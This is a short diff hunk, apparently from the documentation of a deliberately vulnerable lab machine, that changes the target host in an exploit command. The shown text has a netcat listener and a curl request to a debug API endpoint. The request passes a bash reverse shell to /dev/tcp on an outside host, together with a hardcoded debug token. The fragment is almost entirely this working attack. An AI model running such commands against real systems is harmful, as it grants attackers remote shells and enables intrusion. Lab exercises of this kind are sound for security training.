@@ -71,7 +71,7 @@ ENV = "development"
 You can get a shell with the debug url after starting a netcat listener on your side
 ```
 nc -lvnp 4444
-curl -v -G http://localhost:5042/api/debug\
+curl -v -G http://192.168.56.102:5042/api/debug\
  --data-urlencode "cmd=bash -c \"bash -i >& /dev/tcp/192.168.129.23/4444 0>&1\""\
  --data-urlencode "token=h4l_d3bug_t0k3n_2024"
 ```
